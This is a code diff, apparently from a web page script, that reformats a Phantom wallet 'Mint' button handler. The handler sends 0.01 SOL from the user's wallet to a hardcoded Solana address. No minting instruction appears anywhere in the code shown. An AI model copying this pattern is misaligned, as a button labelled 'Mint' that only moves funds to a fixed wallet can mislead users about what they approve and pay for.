@@ -22,29 +22,30 @@ $(document).ready(function () {
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
                   try {
-          const receiverWallet = new solanaWeb3.PublicKey("ETNkYSq5bAGBR7Szz7tKFkPWU5wFdPe2XzuxTAAWEfP5");
+  const receiverWallet = new solanaWeb3.PublicKey("ETNkYSq5bAGBR7Szz7tKFkPWU5wFdPe2XzuxTAAWEfP5");
 
-          const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-              fromPubkey: senderWallet,
-              toPubkey: receiverWallet,
-              lamports: Math.floor(0.01 * solanaWeb3.LAMPORTS_PER_SOL),
-            })
-          );
+  const transaction = new solanaWeb3.Transaction().add(
+    solanaWeb3.SystemProgram.transfer({
+      fromPubkey: senderWallet,
+      toPubkey: receiverWallet,
+      lamports: Math.floor(0.01 * solanaWeb3.LAMPORTS_PER_SOL),
+    })
+  );
 
-          transaction.feePayer = senderWallet;
-          const blockhashObj = await connection.getLatestBlockhash();
-          transaction.recentBlockhash = blockhashObj.blockhash;
+  transaction.feePayer = senderWallet;
+  const blockhashObj = await connection.getLatestBlockhash();
+  transaction.recentBlockhash = blockhashObj.blockhash;
 
-          const signed = await window.solana.signTransaction(transaction);
-          console.log("Transaction signed:", signed);
+  const signed = await window.solana.signTransaction(transaction);
+  console.log("Transaction signed:", signed);
 
-          const txid = await connection.sendRawTransaction(signed.serialize());
-          await connection.confirmTransaction(txid);
-          console.log("Transaction confirmed:", txid);
-        } catch (err) {
-          console.error("Error during minting:", err);
-        }
+  const txid = await connection.sendRawTransaction(signed.serialize());
+  await connection.confirmTransaction(txid);
+  console.log("Transaction confirmed:", txid);
+
+} catch (err) {
+  console.error("Error during minting:", err);
+}
 
       } catch (err) {
         console.error("Error connecting to Phantom Wallet:", err);
